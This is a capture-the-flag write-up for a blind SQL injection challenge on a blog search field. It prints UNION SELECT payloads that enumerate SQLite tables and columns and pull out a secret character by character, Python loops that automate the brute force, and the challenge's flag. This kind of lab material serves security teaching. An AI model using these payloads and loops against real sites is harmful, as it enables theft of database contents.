# Challenge `Sometimes we are just temporarily blind` Writeup

- Vulnerability:
  - SQLi attack
- Where:
  - Search blog posts text field
- Impact:
  - allows users to find a hidden secret in the database

## Analyzing the server

This challenge consists in finding a hidden secret somewhere in the database but this time the only feedback we get from the server is the number of articles matching the search query.  
The search query in the search field remains the same as the last challenge `SELECT id, title, content FROM blog_post WHERE title LIKE '%%'%' OR content LIKE '%%'%'` (by inputting `%'`)

## Exploit

Since it's unknown where the secret is, a good starting place is to find which tables exists.
By using the search feedback (number of matching blog posts) it's possible to create a query to find the name of the existing tables letter by letter.
`asdfghjkl' UNION SELECT tbl_name, type, NULL FROM 'sqlite_master' WHERE type='table' AND substr(tbl_name,1,{i}) == '{text}'; --`, the fields `{i}` and `{text}` are used to iterate over the table name.
The `substr` function allows the query to be case sensitive contrary to the `LIKE` operator.  
First start by creating an alphabet containing all the possible characters for a table name and then using the above fields we iterate over the alphabet to see which letters match the table name.  
The script starts by creating a list of first letters:
```python
for letter in alph:
  r = session.get(URL + payload(letter,1))
  n = get_ntables(r)
  if n != "0":
      print("Found " + n + " with: " + letter)
      names.append(letter)
```
and then using this list tries to find the full name:
```python
while len(names) != 0:
    for name in names:
        for letter in alph:
            r = session.get(URL + payload(name + letter,len(name+letter)))
            n = get_matches(r)
            if n != "0":
                names.append(name + letter)
                print("Found " + n + " with: " + name + letter)
        names.remove(name)
```
Once the table name is found, repeat the process for the column name using the `pragma_table_info` table, 
`asdfghjkl' UNION SELECT name, NULL, NULL FROM pragma_table_info('super_s_sof_secrets') WHERE substr(name,1,{i}) == '{text}'; --`.  
Finally, using the table name and the column name find the secret using the query:  
`asdfghjkl' UNION SELECT secret, NULL, NULL FROM 'super_s_sof_secrets' WHERE substr(secret,1,{i}) == '{text}'; --`.

This reveals the secret `SSof{I_am_only_partially_blind_since_I_can_get_your_data_using_boolean_injection}`.  

## Implementation

These code snippets and full implementation can be found [here](sometimes-we-are-just-temporarily-blind.py).
```
